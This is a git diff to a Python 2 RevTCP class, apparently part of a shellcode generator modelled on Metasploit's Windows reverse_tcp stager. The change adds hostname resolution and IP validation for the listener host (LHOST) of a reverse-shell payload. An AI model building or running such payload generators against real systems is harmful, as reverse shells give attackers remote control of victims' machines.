@@ -3,7 +3,9 @@
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_tcp.rb
 
 import binascii
+import re
 import socket
+import sys
 
 
 class RevTCP:
@@ -44,7 +46,18 @@ class RevTCP:
 
     def set_attrs(self, lport_value, lhost_value):
         self.lport = lport_value
-        self.lhost = lhost_value
+
+        # Check if given a domain or IP address:
+        if self.validate_ip(lhost_value):
+            self.lhost = lhost_value
+        else:
+            try:
+                self.lhost = socket.gethostbyname(lhost_value)
+            except socket.gaierror:
+                print "[*] Error: Invalid domain or IP provided for LHOST value!"
+                print "[*] Error: Please re-run with the correct value."
+                sys.exit()
+
         return
 
     def gen_shellcode(self):
@@ -106,3 +119,16 @@ class RevTCP:
         print "Port: " + str(cli_info.port)
         print "Shellcode Size: " + str(len(self.customized_shellcode.decode('string-escape'))) + '\n'
         return
+
+    def validate_ip(self, val_ip):
+        # This came from (Mult-line link for pep8 compliance)
+        # http://python-iptools.googlecode.com/svn-history/r4
+        # /trunk/iptools/__init__.py
+        ip_re = re.compile(r'^(\d{1,3}\.){0,3}\d{1,3}$')
+        if ip_re.match(val_ip):
+            quads = (int(q) for q in val_ip.split('.'))
+            for q in quads:
+                if q > 255:
+                    return False
+            return True
+        return False
